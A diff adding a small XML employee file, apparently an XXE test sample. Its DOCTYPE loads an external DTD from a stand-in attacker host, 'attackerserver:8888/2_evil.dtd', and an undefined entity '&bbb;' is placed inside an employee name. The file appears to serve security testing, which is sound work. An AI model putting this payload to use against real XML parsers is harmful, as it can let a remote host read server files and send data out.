@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE Company
+[
+ <!ENTITY % aaa SYSTEM "http://attackerserver:8888/2_evil.dtd" > %aaa;
+]>
+
+<Company>
+    <name>ABC</name>
+    <employees>
+        <permanent>
+            <employee id="1">
+                <name>Tom &bbb;</name>
+                <age>42</age>
+                <email>tom@abc.com</email>
+            </employee>
+            <employee id="2">
+                <name>Jerry</name>
+                <age>35</age>
+                <email>jerry@abc.com</email>
+            </employee>
+        </permanent>
+    </employees>
+    
+</Company>
+
